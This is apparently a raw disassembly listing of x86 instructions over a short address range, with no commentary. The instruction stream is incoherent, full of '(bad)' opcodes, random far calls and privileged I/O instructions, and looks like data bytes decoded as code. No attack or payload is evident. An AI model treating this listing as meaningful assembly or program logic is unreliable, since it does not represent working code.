  41db26:	mov    esi,eax
  41db28:	(bad)  
  41db29:	cmp    BYTE PTR [esi+0x55103e17],ah
  41db2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db30:	mov    ah,0x6d
  41db32:	inc    ebp
  41db33:	enter  0xa541,0x15
  41db37:	aam    0xb5
  41db39:	test   eax,0xede48471
  41db3e:	mov    edx,0xc0771fc3
  41db43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db44:	mov    fs,WORD PTR [esi-0x70]
  41db47:	fcomp  DWORD PTR [ebp-0x35e9da87]
  41db4d:	pop    es
  41db4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db4f:	pop    esi
  41db50:	inc    esi
  41db51:	mov    dl,BYTE PTR [eax]
  41db53:	pop    eax
  41db54:	(bad)  
  41db55:	in     eax,0x56
  41db57:	ret    
  41db58:	dec    edx
  41db59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db5a:	push   esp
  41db5b:	mov    al,ds:0xef2d7b8b
  41db60:	add    bl,BYTE PTR [ebx]
  41db62:	dec    eax
  41db63:	dec    edx
  41db64:	xor    BYTE PTR [ecx-0x6d267f66],0xca
  41db6b:	aam    0x2a
  41db6d:	jb     0x41db66
  41db6f:	inc    ebx
  41db70:	(bad)  
  41db71:	or     BYTE PTR [edx+0x273e1333],cl
  41db77:	adc    al,BYTE PTR fs:[edi+0x2db23da6]
  41db7e:	or     DWORD PTR [ebx+0x432e90e1],ebp
  41db84:	pop    edx
  41db85:	or     eax,DWORD PTR [ecx-0x66]
  41db88:	(bad)  [edi]
  41db8a:	in     eax,dx
  41db8b:	sub    eax,0x989a3213
  41db90:	xor    eax,0x8ad99473
  41db95:	into   
  41db96:	push   esi
  41db97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db98:	fidivr WORD PTR [ecx-0x3dc1cacc]
  41db9e:	(bad)  
  41db9f:	xlat   BYTE PTR ds:[ebx]
  41dba0:	mov    dl,0xca
  41dba2:	xor    edi,DWORD PTR ds:0x54fa4d6e
  41dba8:	ret    
  41dba9:	jecxz  0x41dba4
  41dbab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbac:	xor    BYTE PTR [ecx+0x305199b0],ch
  41dbb2:	inc    ecx
  41dbb3:	scas   eax,DWORD PTR es:[edi]
  41dbb4:	shl    DWORD PTR [edi+0x61f0ca9a],0x95
  41dbbb:	sti    
  41dbbc:	stos   BYTE PTR es:[edi],al
  41dbbd:	test   ch,bl
  41dbbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbc0:	xor    BYTE PTR [eax-0x2199374f],al
  41dbc6:	and    ah,cl
  41dbc8:	mov    dl,0xd8
  41dbca:	push   esp
  41dbcb:	xchg   ebx,eax
  41dbcc:	sub    eax,0x7a89c579
  41dbd1:	or     ebx,DWORD PTR [ecx-0x3435c2a4]
  41dbd7:	add    dh,BYTE PTR [ebx]
  41dbd9:	hlt    
  41dbda:	call   0xf9cd:0x2a71a1ab
  41dbe1:	(bad)  
  41dbe2:	sti    
  41dbe3:	lahf   
  41dbe4:	sahf   
  41dbe5:	cmp    al,0x9a
  41dbe7:	dec    ecx
  41dbe8:	mov    ah,0xae
  41dbea:	jne    0x41db87
  41dbec:	pop    ecx
  41dbed:	sbb    dh,dl
  41dbef:	daa    
  41dbf0:	lods   eax,DWORD PTR ds:[esi]
  41dbf1:	or     ah,dl
  41dbf3:	xor    DWORD PTR [ebp+eiz*4-0x65cae0ea],eax
  41dbfa:	enter  0xb6a7,0x68
  41dbfe:	ins    DWORD PTR es:[edi],dx
  41dbff:	(bad)  
  41dc01:	or     dh,BYTE PTR [edi]
  41dc03:	sti    
  41dc04:	push   ecx
  41dc05:	fbstp  TBYTE PTR [edx+0x7a]
  41dc08:	mov    dl,0xd2
  41dc0a:	add    al,0x93
  41dc0c:	pop    ebp
  41dc0d:	push   cs
  41dc0e:	and    eax,DWORD PTR [bp+di]
  41dc11:	stc    
  41dc12:	mov    bl,0xef
  41dc14:	test   DWORD PTR [edx],edx
  41dc16:	popf   
  41dc17:	clc    
  41dc18:	xor    al,0x81
  41dc1a:	and    edi,esp
  41dc1c:	xor    ch,BYTE PTR [esi+ebp*1+0x66]
  41dc20:	nop
  41dc21:	or     DWORD PTR [edx+0x4eb4fa03],ebx
  41dc27:	rcr    BYTE PTR [ebx+0x49a24654],1
  41dc2d:	lds    esp,FWORD PTR [eax+ebp*4+0x7533cc03]
  41dc34:	adc    DWORD PTR [ecx+0x2c62965a],eax
  41dc3a:	call   0xbc39:0x17901b12
  41dc41:	icebp  
  41dc42:	scas   eax,DWORD PTR es:[edi]
  41dc43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc44:	gs aas 
  41dc46:	jg     0x41dc3f
  41dc48:	dec    ebp
  41dc49:	sbb    al,0xa0
  41dc4b:	cmp    esi,DWORD PTR [edx+0x37f47cd4]
  41dc51:	jo     0x41dc7f
  41dc53:	out    dx,eax
  41dc54:	dec    DWORD PTR [ebx]
  41dc56:	jmp    0x39ab512c
  41dc5b:	int    0xf7
  41dc5d:	sbb    eax,0x8b75e5a1
  41dc62:	push   edx
  41dc63:	sub    dh,dl
  41dc65:	mov    esi,0xaeae8db
  41dc6a:	ins    BYTE PTR es:[edi],dx
  41dc6b:	sbb    cl,bl
  41dc6d:	xor    eax,0xf76bd8f0
  41dc72:	sub    al,0xf5
  41dc74:	mov    dl,0x5a
  41dc76:	sar    BYTE PTR [esi],0x2f
  41dc79:	mov    ?,WORD PTR ds:0x8c2514a5
  41dc7f:	xchg   esp,eax
  41dc80:	outs   dx,BYTE PTR ds:[esi]
  41dc81:	or     esi,ebp
  41dc83:	sub    DWORD PTR [edi+ecx*4+0x6ab2213f],ebx
  41dc8a:	mov    esp,0xeaf697c3
  41dc8f:	pusha  
  41dc90:	or     esi,DWORD PTR es:[edx+0x55]
  41dc94:	das    
  41dc95:	xor    dh,BYTE PTR [ecx-0x43]
  41dc98:	or     DWORD PTR [edx+0x5205c094],edi
  41dc9e:	jmp    0x41dc67
  41dca0:	push   ecx
  41dca1:	xchg   ecx,eax
  41dca2:	dec    eax
  41dca3:	ror    BYTE PTR [ebx],cl
  41dca5:	je     0x41dd0d
  41dca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dca8:	lods   eax,DWORD PTR ds:[esi]
  41dca9:	or     bh,cl
  41dcab:	pusha  
  41dcac:	sub    al,0x31
  41dcae:	out    dx,al
  41dcaf:	add    eax,0x2c0b9eb2
  41dcb4:	(bad)  [esi+edx*2-0x22f4e72b]
  41dcbb:	mov    ds:0xcf4dc540,al
  41dcc0:	jge    0x41dcc5
  41dcc2:	call   0x3ce8:0xca99113d
  41dcc9:	ret    
  41dcca:	into   
  41dccb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dccc:	ss sbb al,0x65
  41dccf:	ja     0x41dc9b
  41dcd1:	js     0x41dccb
  41dcd3:	rcl    BYTE PTR [esi-0x4ae4cad9],0xe2
  41dcda:	icebp  
  41dcdb:	aaa    
  41dcdc:	inc    ebp
  41dcdd:	jg     0x41dcf8
  41dcdf:	call   0xb94:0xad70e323
  41dce6:	out    0x3e,al
  41dce8:	jb     0x41dcd3
  41dcea:	loopne 0x41dca3
  41dcec:	test   BYTE PTR [ecx-0x2839c666],ah
  41dcf2:	je     0x41dd22
  41dcf4:	fidivr WORD PTR [edx]
  41dcf6:	shl    DWORD PTR [edi-0x27916cef],1
  41dcfc:	cmp    ah,BYTE PTR ds:0xdab27fb9
  41dd02:	jp     0x41dd46
  41dd04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd05:	int    0x83
  41dd07:	xor    bl,ch
  41dd09:	or     esi,DWORD PTR [ecx-0x442f2b62]
  41dd0f:	ret    0x2f70
  41dd12:	call   0xfe3b:0x6b6fa1e6
  41dd19:	(bad)  
  41dd1a:	or     al,0xa6
  41dd1c:	push   0x15
  41dd1e:	or     eax,0x35328afc
  41dd23:	ja     0x41dd48
  41dd25:	daa    
  41dd26:	in     al,0x55
  41dd28:	mov    ch,0x62
  41dd2a:	adc    al,0xd5
  41dd2c:	xor    eax,0x1efbaa7f
  41dd31:	pop    ebp
  41dd32:	lock mov cl,0x66
  41dd35:	jecxz  0x41dcc8
  41dd37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd38:	pop    ecx
  41dd39:	pop    ds
  41dd3a:	jecxz  0x41dd7e
  41dd3c:	cli    
  41dd3d:	jae    0x41dcd8
  41dd3f:	xchg   BYTE PTR [edx],bh
  41dd41:	test   BYTE PTR [ecx+0x7ac47b75],ch
  41dd47:	sub    ch,BYTE PTR [eax-0x1d587215]
  41dd4d:	outs   dx,DWORD PTR ds:[si]
  41dd4f:	into   
  41dd50:	jge    0x41dd99
  41dd52:	inc    ebx
  41dd53:	dec    edi
  41dd54:	mov    dl,0xb4
  41dd56:	sub    bl,bh
  41dd58:	xchg   ecx,eax
  41dd59:	popa   
  41dd5a:	mov    cl,0x95
  41dd5c:	mov    cl,BYTE PTR [eax]
  41dd5e:	or     BYTE PTR [ebx],bh
  41dd60:	dec    ebp
  41dd61:	adc    eax,0x881ab671
  41dd66:	mov    eax,0xa635b200
  41dd6b:	jo     0x41dd15
  41dd6d:	push   edi
  41dd6e:	das    
  41dd6f:	inc    ecx
  41dd70:	mov    eax,0x74a431bb
  41dd75:	push   ebx
  41dd76:	les    edi,FWORD PTR [eax+0x6662742c]
  41dd7c:	mov    ah,0x3
  41dd7e:	call   0x95b3:0x8243f2b4
  41dd85:	dec    edi
  41dd86:	pop    edi
  41dd87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd88:	push   ecx
  41dd89:	fiadd  DWORD PTR [edi]
  41dd8b:	xor    BYTE PTR [esi-0x77],al
  41dd8e:	in     al,dx
  41dd8f:	daa    
  41dd90:	lods   al,BYTE PTR ds:[esi]
  41dd91:	inc    edx
  41dd92:	xchg   edx,eax
  41dd93:	ret    0x3530
  41dd96:	test   eax,0x386b9b89
  41dd9b:	xchg   ebx,eax
  41dd9c:	aad    0xb
  41dd9e:	dec    edi
  41dd9f:	lock gs cmp ecx,ebx
  41dda3:	adc    ch,al
  41dda5:	adc    BYTE PTR [eax-0x2],ch
  41dda8:	mov    dl,0x98
  41ddaa:	xchg   DWORD PTR [ecx],ecx
  41ddac:	jbe    0x41dd5f
  41ddae:	sahf   
  41ddaf:	adc    esp,DWORD PTR [esi+0xb]
  41ddb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddb3:	mov    dh,0xca
  41ddb5:	jmp    0x7c9a:0x4be0a85d
  41ddbc:	ins    DWORD PTR es:[edi],dx
  41ddbd:	cld    
  41ddbe:	(bad)  [ecx]
  41ddc0:	mov    ds,ecx
  41ddc2:	inc    esp
  41ddc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddc4:	jbe    0x41dda3
  41ddc6:	fwait
  41ddc7:	jbe    0x41dd56
  41ddc9:	(bad)  
  41ddca:	pop    ecx
  41ddcb:	dec    edi
  41ddcc:	dec    edi
  41ddcd:	sahf   
  41ddce:	call   0xc29a:0xb45b90bc
  41ddd5:	mov    BYTE PTR [ebp+0x602f8ca7],al
  41dddb:	pop    esi
  41dddc:	mov    al,0xef
  41ddde:	adc    DWORD PTR ds:0xb43cfcee,edx
  41dde4:	out    dx,eax
  41dde5:	adc    BYTE PTR [edx+0x14],bl
  41dde8:	call   0x8a28:0xf8a04603
  41ddef:	sbb    DWORD PTR [esi+0x3e6c6c5b],ebp
  41ddf5:	in     eax,dx
  41ddf6:	mov    al,al
  41ddf8:	arpl   WORD PTR [ebx-0x30fa8266],sp
  41ddfe:	out    0xec,al
  41de00:	add    BYTE PTR [eax],dh
  41de02:	pop    ss
  41de03:	clc    
  41de04:	mov    ebp,0x328fd4bf
  41de09:	test   BYTE PTR [ebp-0x64d66706],dh
  41de0f:	xchg   DWORD PTR [edx],ebx
  41de11:	sar    DWORD PTR ds:[ecx-0x5f],1
  41de15:	rcr    DWORD PTR [esi+0x1a],cl
  41de18:	push   0xad8da753
  41de1d:	cmc    
  41de1e:	aam    0x27
  41de20:	daa    
  41de21:	cmp    BYTE PTR [eax+0x15],dh
  41de24:	xor    DWORD PTR [ebp-0x1d],ecx
  41de27:	icebp  
  41de28:	mov    bh,0x5c
  41de2a:	(bad)  
  41de2b:	pop    edx
  41de2c:	inc    eax
  41de2d:	push   ebx
  41de2e:	pop    edx
  41de2f:	or     eax,0xa12e7bac
  41de34:	mov    eax,ds:0xbc78a92
  41de39:	mov    edx,eax
  41de3b:	jbe    0x41de39
  41de3d:	dec    ebx
  41de3e:	imul   ebx,DWORD PTR [edx+esi*4],0x7e
  41de42:	sub    dh,bl
  41de44:	lock and esi,DWORD PTR [edx]
  41de47:	jae    0x41deb3
  41de49:	inc    edi
  41de4a:	js     0x41dea1
  41de4c:	mov    ebp,0xf272a37c
  41de51:	adc    DWORD PTR [esi],esp
  41de53:	cmp    al,0xea
  41de55:	sbb    eax,0x855bcd9a
  41de5a:	mov    edi,0x10c4a563
  41de5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de60:	adc    BYTE PTR [esi+0x296b95d2],dl
  41de66:	jl     0x41de11
  41de68:	mov    dl,0xd1
  41de6a:	add    DWORD PTR [ebx+0x7be9cc0b],eax
  41de70:	jp     0x41de77
  41de72:	mov    eax,ds:0xda08d123
  41de77:	pop    ss
  41de78:	jnp    0x41de14
  41de7a:	xchg   edi,eax
  41de7b:	scas   eax,DWORD PTR es:[edi]
  41de7c:	mov    dl,0x1f
  41de7e:	xor    al,0x8
  41de80:	imul   DWORD PTR [eax+0xb4419b8]
  41de86:	cli    
  41de87:	es ret 0x6a24
  41de8b:	pop    ebp
  41de8c:	call   0x1c5a7343
  41de91:	sbb    ecx,DWORD PTR [edx]
  41de93:	cwde   
  41de94:	and    DWORD PTR [ebx+0x4f203b99],esi
  41de9a:	es pop es
  41de9c:	fs ja  0x41de53
  41de9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dea0:	aas    
  41dea1:	dec    esi
  41dea2:	fmul   st(7),st
  41dea4:	inc    eax
  41dea5:	pop    eax
  41dea6:	adc    dh,BYTE PTR [edx]
  41dea8:	inc    edi
  41dea9:	dec    edx
  41deaa:	call   0x78dc:0xb1759243
  41deb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41deb2:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41deb4:	ja     0x41dee9
  41deb6:	adc    eax,0xc481cd1b
  41debb:	or     eax,0x5e862fad
  41dec0:	repnz iret 
  41dec2:	cli    
  41dec3:	pop    ds
  41dec4:	jecxz  0x41df1f
  41dec6:	dec    ebp
  41dec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dec8:	inc    esi
  41dec9:	ins    BYTE PTR es:[edi],dx
  41deca:	push   esp
  41decb:	jmp    0x41dea7
  41decd:	(bad)  
  41dece:	cmp    ebx,DWORD PTR [ebx]
  41ded0:	push   esp
  41ded1:	dec    edx
  41ded2:	cdq    
  41ded3:	xor    esi,esi
  41ded5:	sbb    dl,BYTE PTR [ebx]
  41ded7:	pushw  ds
  41ded9:	jecxz  0x41dee8
  41dedb:	aam    0xa0
  41dedd:	or     esi,DWORD PTR [edx]
  41dedf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dee0:	out    dx,al
  41dee1:	inc    ecx
  41dee2:	int3   
  41dee3:	jl     0x41de90
  41dee5:	rol    BYTE PTR [edx],cl
  41dee7:	add    eax,0xe93834b3
  41deec:	dec    ecx
  41deed:	retf   
  41deee:	mov    ds:0xac177ae5,al
  41def3:	push   edi
  41def4:	pop    edi
  41def5:	je     0x41dec5
  41def7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41def8:	aad    0xd2
  41defa:	dec    edi
  41defb:	push   ss
  41defc:	dec    ebx
  41defd:	(bad)  
  41deff:	push   ecx
  41df00:	mov    dl,0x2a
  41df02:	adc    DWORD PTR [edx+0x69],0xffffffa7
  41df06:	cmp    esp,DWORD PTR [ebp+eiz*4-0xd5092f7]
  41df0d:	and    cl,BYTE PTR [eax]
  41df0f:	push   ebp
  41df10:	push   edx
  41df11:	div    BYTE PTR gs:[edx+0x42f5a4bc]
  41df18:	lds    ecx,FWORD PTR [ebx]
  41df1a:	outs   dx,DWORD PTR ds:[esi]
  41df1b:	stc    
  41df1c:	sbb    DWORD PTR [ecx+esi*4],ebx
  41df1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df20:	cmc    
  41df21:	push   ss
  41df22:	mov    ebx,0x60f6c8e6
  41df27:	xchg   esi,eax
  41df28:	cli    
  41df29:	cwde   
  41df2a:	xor    al,0xd8
  41df2c:	mov    bl,0xc1
  41df2e:	std    
  41df2f:	mul    BYTE PTR [ebx]
  41df31:	int3   
  41df32:	je     0x41df43
  41df34:	pop    edx
  41df35:	popa   
  41df36:	mov    ecx,0xc7bb90a6
  41df3b:	inc    DWORD PTR [edx-0x3d]
  41df3e:	pop    es
  41df3f:	je     0x41df4b
  41df41:	sub    eax,0xdbb2438b
  41df46:	mov    al,0x26
  41df48:	pusha  
  41df49:	std    
  41df4a:	shl    DWORD PTR [ecx],cl
  41df4c:	sahf   
  41df4d:	or     edi,DWORD PTR [esi+0x3b48b37e]
  41df53:	sub    eax,0xc79a744f
  41df58:	jb     0x41df32
  41df5a:	pop    ss
  41df5b:	js     0x41dfbf
  41df5d:	popa   
  41df5e:	ss pop ebp
  41df60:	and    edi,ebx
  41df62:	mov    esp,0x2309769f
  41df67:	shl    BYTE PTR [ecx+eax*2],1
  41df6a:	adc    DWORD PTR [edx+0x27abe545],esp
  41df70:	addr16 int 0x13
  41df73:	mov    esp,0x11db4eb2
  41df78:	mov    eax,ds:0x7f5738f2
  41df7d:	add    eax,0xf0d74f1d
  41df82:	cmc    
  41df83:	out    0x92,eax
  41df85:	push   esi
  41df86:	in     al,dx
  41df87:	fs push es
  41df89:	setp   bh
  41df8c:	add    al,al
  41df8e:	in     eax,0xb9
  41df90:	mov    bl,0x18
  41df92:	aam    0x98
  41df94:	lea    edi,[edx-0x13cd535b]
  41df9a:	(bad)  
  41df9b:	fstp   DWORD PTR [ecx+0x43]
  41df9e:	pushf  
  41df9f:	jno    0x41df53
  41dfa1:	push   eax
  41dfa2:	je     0x41dff6
  41dfa4:	into   
  41dfa5:	and    DWORD PTR [ebx-0x59f4e8a4],ebx
  41dfab:	enter  0xef89,0xe
  41dfaf:	out    0xa3,eax
  41dfb1:	pusha  
  41dfb2:	fwait
  41dfb3:	leave  
  41dfb4:	shl    BYTE PTR [esi+ebp*1-0x158f7594],1
  41dfbb:	dec    ebp
  41dfbc:	sahf   
  41dfbd:	aaa    
  41dfbe:	lahf   
  41dfbf:	or     eax,0xb3e23936
  41dfc4:	icebp  
  41dfc5:	retf   
  41dfc6:	aaa    
  41dfc7:	sub    eax,0x2299d9b4
  41dfcc:	push   ds
  41dfcd:	scas   eax,DWORD PTR es:[edi]
  41dfce:	sahf   
  41dfcf:	jmp    0x65a2a3a0
  41dfd4:	mov    eax,0x9df3ec0b
  41dfd9:	cld    
  41dfda:	stc    
  41dfdb:	scas   eax,DWORD PTR es:[edi]
  41dfdc:	aas    
  41dfdd:	arpl   WORD PTR [edx-0x2c7a94aa],bx
  41dfe3:	out    0xed,eax
  41dfe5:	dec    ecx
  41dfe6:	js     0x41df8f
  41dfe8:	lahf   
  41dfe9:	fcmovnbe st,st(0)
  41dfeb:	jne    0x41dffb
  41dfed:	ffree  st(7)
  41dfef:	shl    DWORD PTR [edx+0x1fd89b64],cl
  41dff5:	xlat   BYTE PTR ds:[ebx]
  41dff6:	sub    ecx,DWORD PTR [ecx+eiz*8+0x9]
  41dffa:	cmp    esi,DWORD PTR [edi+0x16]
  41dffd:	inc    esi
  41dffe:	push   esi
  41dfff:	sbb    edx,DWORD PTR [edx-0x76]
  41e002:	add    dl,BYTE PTR [edi*4-0x6944e043]
  41e009:	dec    ebx
  41e00a:	push   ecx
  41e00b:	leave  
  41e00c:	adc    edi,edi
  41e00e:	jecxz  0x41dfb7
  41e010:	mov    DWORD PTR [esi],esi
  41e012:	jbe    0x41dfd3
  41e014:	mov    ch,0x4f
  41e016:	xor    esi,DWORD PTR [ebx-0x4d]
  41e019:	inc    esp
  41e01a:	ret    
  41e01b:	popa   
  41e01c:	scas   al,BYTE PTR es:[edi]
  41e01d:	sub    eax,DWORD PTR [ecx]
  41e01f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e020:	repnz scas al,BYTE PTR es:[edi]
  41e022:	mov    ds:0xaf0b0f1e,eax
  41e027:	lock sub eax,0x83a906cc
  41e02d:	neg    DWORD PTR [edx-0x5e61017e]
  41e033:	mov    edx,DWORD PTR [edx+0x11]
  41e036:	sti    
  41e037:	mov    edx,0x6700c401
  41e03c:	mov    ds,WORD PTR [edx+eiz*2]
  41e03f:	jbe    0x41dff8
  41e041:	mov    bh,0x86
  41e043:	ror    eax,0x89
  41e046:	call   0x3120:0xcbad0c02
  41e04d:	cmc    
  41e04e:	ret    0x21a7
  41e051:	les    edi,FWORD PTR [ebx]
  41e053:	cmp    BYTE PTR [ebp+esi*8-0x70],0xbc
  41e058:	mov    dl,0x9e
  41e05a:	lds    edx,FWORD PTR [edi]
  41e05c:	push   0xa61d04f7
  41e061:	or     ebp,DWORD PTR [eax]
  41e063:	xor    bh,ah
  41e065:	icebp  
  41e066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e067:	dec    esp
  41e068:	xchg   ebx,eax
  41e069:	xchg   DWORD PTR [ecx-0x1b9fbda0],ebx
  41e06f:	and    ah,dl
  41e071:	sbb    DWORD PTR [ebx-0x72fadd01],0x63
  41e078:	arpl   WORD PTR [edx+edi*1],ax
  41e07b:	pop    esi
  41e07c:	stos   DWORD PTR es:[edi],eax
  41e07d:	test   al,0x3f
  41e07f:	add    esi,DWORD PTR [edx-0x75a04e39]
  41e085:	loop   0x41e02f
  41e087:	es jae 0x41e106
  41e08a:	sbb    BYTE PTR [edi-0x5d89586a],ah
  41e090:	mov    esp,0xb5e65ade
  41e095:	into   
  41e096:	push   cs
  41e097:	daa    
  41e098:	xlat   BYTE PTR ds:[ebx]
  41e099:	or     eax,0x2422e33a
  41e09e:	add    bh,BYTE PTR [ebx-0x58c2fedc]
  41e0a4:	sub    al,0x47
  41e0a6:	mov    esp,eax
  41e0a8:	mov    al,ds:0xb27d789f
  41e0ad:	mov    bl,0x70
  41e0af:	dec    edx
  41e0b0:	dec    ebp
  41e0b1:	(bad)  
  41e0b2:	lds    ebp,FWORD PTR [esi+eiz*4+0x3adefe0c]
  41e0b9:	rcl    ebx,0x7
  41e0bc:	loop   0x41e095
  41e0be:	mov    dl,0xf2
  41e0c0:	mov    dl,0x58
  41e0c2:	push   esp
  41e0c3:	call   0xb32:0xe7114f62
  41e0ca:	push   ss
  41e0cb:	enter  0x836d,0x81
  41e0cf:	pop    edi
  41e0d0:	mov    esp,0x92099ad2
  41e0d5:	mov    WORD PTR [ebx+0x67488d86],cs
  41e0db:	mov    al,ds:0x9213e6e2
  41e0e0:	ins    DWORD PTR es:[edi],dx
  41e0e1:	sbb    edx,DWORD PTR [esi]
  41e0e3:	ret    
  41e0e4:	test   ecx,esi
  41e0e6:	test   DWORD PTR [ebx],ecx
  41e0e8:	imul   ecx,DWORD PTR [ebx-0x4071cf26],0xffffffe1
  41e0ef:	or     DWORD PTR [ebx+ecx*1],esi
  41e0f2:	loop   0x41e095
  41e0f4:	mov    dh,0xeb
  41e0f6:	fs into 
  41e0f8:	fxch   st(1)
  41e0fa:	jl     0x41e0ce
  41e0fc:	mov    dl,0xa2
  41e0fe:	push   0x88c1ddbd
  41e103:	mov    esp,0xa3240b2d
  41e108:	and    bh,BYTE PTR [eax-0x4e]
  41e10b:	arpl   ax,dx
  41e10d:	gs jecxz 0x41e0fc
  41e110:	mov    cl,0x4
  41e112:	mov    dh,0xc3
  41e114:	lds    esp,FWORD PTR [edx-0x68]
  41e117:	pop    ds
  41e118:	hlt    
  41e119:	jb     0x41e13a
  41e11b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e11c:	call   0x17d2:0x62ace4c8
  41e123:	jecxz  0x41e0dc
  41e125:	repz add ah,BYTE PTR [ecx+0x7c1ab7b8]
  41e12c:	mov    bl,ch
  41e12e:	xor    al,0xa7
  41e130:	inc    esp
  41e131:	push   edx
  41e132:	adc    edx,DWORD PTR [edx+0x70]
  41e135:	adc    ecx,DWORD PTR [eax+0x1d]
  41e138:	mov    dl,0xd6
  41e13a:	fmul   st(3),st
  41e13c:	add    esi,ebx
  41e13e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e13f:	cmp    eax,0x61330bce
  41e144:	int3   
  41e145:	loope  0x41e117
  41e147:	pop    edx
  41e148:	aam    0x5a
  41e14a:	in     al,0xab
  41e14c:	sar    BYTE PTR [ecx-0x72305366],0xdd
  41e153:	sti    
  41e154:	pop    ebp
  41e155:	xor    BYTE PTR [eax-0x59],bh
  41e158:	jb     0x41e12a
  41e15a:	retf   0x7fc
  41e15d:	cs in  al,dx
  41e15f:	jae    0x41e1ad
  41e161:	push   cs
  41e162:	popf   
  41e163:	jb     0x41e164
  41e165:	out    dx,eax
  41e166:	in     eax,0x42
  41e168:	mov    dl,0x44
  41e16a:	mov    bl,bl
  41e16c:	pop    esp
  41e16d:	or     ecx,DWORD PTR [eax]
  41e16f:	inc    eax
  41e170:	xor    al,0xd
  41e172:	test   bh,cl
  41e174:	(bad)  [edi-0x345ad066]
  41e17a:	adc    DWORD PTR [esi],esp
  41e17c:	icebp  
  41e17d:	xchg   esp,eax
  41e17e:	xor    DWORD PTR [esi+eiz*2-0x60a27e14],esp
  41e185:	dec    edx
  41e186:	adc    al,al
  41e188:	mov    edx,0x255f7578
  41e18d:	lods   eax,DWORD PTR ds:[esi]
  41e18e:	test   DWORD PTR [ecx+0x7ada3552],ecx
  41e194:	and    al,0x22
  41e196:	and    eax,DWORD PTR [ebp+0x7b740c05]
  41e19c:	mov    al,ds:0xe3a486b6
  41e1a1:	out    0x12,al
  41e1a3:	pop    ds
  41e1a4:	fisttp WORD PTR [esi-0x29b89e66]
  41e1aa:	pop    eax
  41e1ab:	repz push ebp
  41e1ad:	pop    esp
  41e1ae:	ret    0x5d8
  41e1b1:	or     esp,DWORD PTR [ebx-0x1f]
  41e1b4:	add    al,0xfb
  41e1b6:	jg     0x41e194
  41e1b8:	imul   ebp,DWORD PTR [edx],0x7e
  41e1bb:	xor    eax,0xc5f03fb2
  41e1c0:	pop    ds
  41e1c1:	test   eax,0x241b28ce
  41e1c6:	sub    bl,BYTE PTR [esp+eiz*2+0x27ad9a90]
  41e1cd:	mov    DWORD PTR [esi],edx
  41e1cf:	je     0x41e20a
  41e1d1:	or     BYTE PTR [esi+0x1],dl
  41e1d4:	jl     0x41e1da
  41e1d6:	dec    esi
  41e1d7:	and    bh,BYTE PTR [edx]
  41e1d9:	mov    WORD PTR [ebx],?
  41e1db:	inc    esp
  41e1dc:	xchg   esp,eax
  41e1dd:	push   ss
  41e1de:	xchg   ebx,eax
  41e1df:	mov    esi,0x1cbcfbb2
  41e1e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1e5:	push   es
  41e1e6:	mov    DWORD PTR [edi+ebx*2-0x5365e631],esp
  41e1ed:	push   edx
  41e1ee:	(bad)  
  41e1ef:	fcmovnu st,st(1)
  41e1f1:	jecxz  0x41e271
  41e1f3:	and    BYTE PTR [eax+0x4ad9d7be],ch
  41e1f9:	dec    ebx
  41e1fa:	mov    WORD PTR [ebx+ebx*8-0x35a25ec],cs
  41e201:	retf   0xfd2
  41e204:	(bad)
  41e207:	outs   dx,DWORD PTR ds:[esi]
  41e208:	fwait
  41e209:	and    eax,esi
  41e20b:	xlat   BYTE PTR ds:[ebx]
  41e20c:	je     0x41e219
  41e20e:	dec    esi
  41e20f:	aam    0x3c
  41e211:	std    
  41e212:	pop    ss
  41e213:	out    dx,al
  41e214:	int3   
  41e215:	xchg   ebx,eax
  41e216:	stc    
  41e217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e218:	mov    ds:0x8faf158b,al
  41e21d:	pop    ecx
  41e21e:	sbb    eax,0xcb47ee9d
  41e223:	fidiv  WORD PTR [edx+0x5ad702d3]
  41e229:	fidiv  DWORD PTR [ebx-0x8f4dd5c]
  41e22f:	ins    BYTE PTR es:[edi],dx
  41e230:	dec    esp
  41e231:	stos   DWORD PTR es:[edi],eax
  41e232:	mov    dh,ah
  41e234:	add    ch,BYTE PTR [eax+0x1dfa7b67]
  41e23a:	cdq    
  41e23b:	sbb    cl,bh
  41e23d:	pop    ss
  41e23e:	pop    ss
  41e23f:	xchg   ebp,eax
  41e240:	mov    es,ebx
  41e242:	mov    bh,0x5a
  41e244:	into   
  41e245:	or     eax,edx
  41e247:	iret   
  41e248:	test   dl,0xfd
  41e24b:	daa    
  41e24c:	sbb    eax,0x63739a7e
  41e251:	push   ebp
  41e252:	rcl    edi,0x21
  41e255:	sbb    eax,0xe695a7fe
  41e25a:	sbb    al,0x5f
  41e25c:	jecxz  0x41e22c
  41e25e:	daa    
  41e25f:	mov    bh,0xb2
  41e261:	mov    WORD PTR [ebx-0x6a4df811],fs
  41e267:	cmp    dl,BYTE PTR [esp+edi*2]
